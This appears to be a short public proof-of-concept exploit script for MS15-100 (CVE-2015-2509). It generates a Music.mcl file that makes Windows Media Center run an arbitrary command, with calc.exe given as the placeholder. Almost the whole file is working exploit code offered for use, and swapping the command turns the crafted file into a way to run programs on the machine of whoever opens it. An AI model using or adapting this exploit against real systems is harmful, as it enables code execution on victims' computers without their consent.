# Title: MS15-100 Windows Media Center Command Execution
# Date : 11/09/2015
# Author: R-73eN
# Software: Windows Media Center
# Tested : Windows 7 Ultimate
# CVE : 2015-2509


banner = ""
banner += " ___        __        ____                 _    _  \n" 
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner

command = "calc.exe"
evil = '<application run="' + command + '"/>'
f = open("Music.mcl","w")
f.write(evil)
f.close()
print "\n[+] Music.mcl generated . . . [+]"